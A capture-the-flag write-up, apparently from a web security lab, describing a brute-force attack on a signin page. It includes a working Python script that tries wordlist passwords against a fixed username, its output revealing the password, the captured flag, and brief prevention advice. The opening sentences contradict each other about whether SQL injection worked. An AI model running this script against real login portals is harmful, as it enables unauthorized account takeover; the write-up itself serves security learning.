# Description

Visting the signin page, we could not find an sql injection.

Therefore we decide to bruteforce the signin page.

After we exploited the sql and got the users on the Database. We found the username GetThe.

So we will use this use to bruteforce the login and find the flag.

# Attack

I made a python script that bruteforce the login portal with the username `GetThe`

```pyhton
import requests
import argparse

def brute_force(wordlist_path):
    with open(wordlist_path, 'r') as wordlist:
        for line in wordlist:
            password = line.strip()  # Remove newline characters
            print("[+]Trying {0}".format(password))
            response = requests.get('http://10.14.59.83/index.php?page=signin&username=GetThe&password='+password+'&Login=Login')
            if "WrongAnswer" not in response.text:
                print(f"Password found: {password}")
                return
    print("Password not found in the provided wordlist")

def main():
    parser = argparse.ArgumentParser(description="Simple brute force script")
    parser.add_argument("wordlist", help="Path to the wordlist file")
    args = parser.parse_args()

    brute_force(args.wordlist)

if __name__ == "__main__":
    main()
```
After we run the script it found the password

```bash
*[main][~/projects/darkly/BruteForce/Ressources]$ python3 Bruteforce.py wordlist.txt 
[+]Trying 12345
[+]Trying abc123
[+]Trying password
[+]Trying computer
[+]Trying 123456
[+]Trying tigger
[+]Trying shadow
Password found: shadow
*[main][~/projects/darkly/BruteForce/Ressources]$ 
```

The password is `shadow`

Now we will try to login to using those creds and get the flag.

Finaly
`The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 `

# Prevention
- **Account Lockout:** Implement an account lockout mechanism that temporarily locks an account after a certain number of unsuccessful login attempts. This helps mitigate brute-force attacks by preventing attackers from continuously trying different passwords.

- **CAPTCHA:** Use CAPTCHA challenges during the login process to differentiate between human users and automated scripts. This can make it significantly harder for attackers to automate brute-force attempts.

- **Rate Limiting:** Implement rate limiting on login attempts. Limit the number of login requests from the same IP address or user within a certain time frame. This can slow down brute-force attacks and discourage attackers.